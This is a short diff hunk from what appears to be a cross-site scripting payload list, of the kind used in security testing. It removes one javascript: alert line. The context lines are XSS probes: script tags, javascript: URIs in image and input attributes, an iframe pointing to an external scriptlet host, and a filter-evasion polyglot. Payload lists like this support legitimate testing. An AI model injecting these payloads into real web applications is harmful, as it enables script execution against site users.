@@ -226,7 +226,6 @@ foo<script>alert(1)</script>
 <INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>
 <IMG SRC=”javascript:alert(‘XSS’)”
 <iframe src=http://ha.ckers.org/scriptlet.html <
-javascript:alert("hellox worldss")
 <img src="javascript:alert('XSS');">
 <img src=javascript:alert(&quot;XSS&quot;)>
 <"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
